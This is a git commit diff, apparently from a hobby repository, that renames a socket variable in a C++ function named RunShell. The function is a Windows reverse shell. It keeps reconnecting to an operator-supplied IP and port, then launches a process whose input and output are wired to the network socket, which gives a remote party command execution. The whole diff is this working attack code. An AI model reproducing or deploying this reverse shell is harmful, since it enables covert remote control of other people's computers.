702b41a6af95adc57b3c3239062ce61ff1576717
Akex64 <61739633+Akex64@users.noreply.github.com>
2020-10-22 20:39:03 +0200

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -12,19 +12,19 @@ void RunShell(char* ip, int port)
 {
     while (true)
    	{
-        SOCKET mySocket;
+        SOCKET socket;
         sockaddr_in addr;
         WSADATA version;
         auto ret = WSAStartup(MAKEWORD(2, 2), &version);
-        mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+        socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
         addr.sin_family = AF_INET;
 
         addr.sin_addr.s_addr = inet_addr(ip);
         addr.sin_port = htons(port);
 
-        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) 
+        if (WSAConnect(socket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) 
         {
-            closesocket(mySocket);
+            closesocket(socket);
             WSACleanup();
             continue;
         }
@@ -32,10 +32,10 @@ void RunShell(char* ip, int port)
         {
             char data[1024];
             memset(data, 0, sizeof(data));
-            int code = recv(mySocket, data, 1024, 0);
+            int code = recv(socket, data, 1024, 0);
             if (code <= 0) 
             {
-                closesocket(mySocket);
+                closesocket(socket);
                 WSACleanup();
                 continue;
             }
@@ -47,17 +47,17 @@ void RunShell(char* ip, int port)
                 memset(&sinfo, 0, sizeof(sinfo));
                 sinfo.cb = sizeof(sinfo);
                 sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;
+                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)socket;
                 CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                 WaitForSingleObject(pinfo.hProcess, INFINITE);
                 CloseHandle(pinfo.hProcess);
                 CloseHandle(pinfo.hThread);
 
                 memset(data, 0, sizeof(data));
-                int code = recv(mySocket, data, 1024, 0);
+                int code = recv(socket, data, 1024, 0);
                 if (code <= 0) 
                 {
-                    closesocket(mySocket);
+                    closesocket(socket);
                     WSACleanup();
                     continue;
                 }       
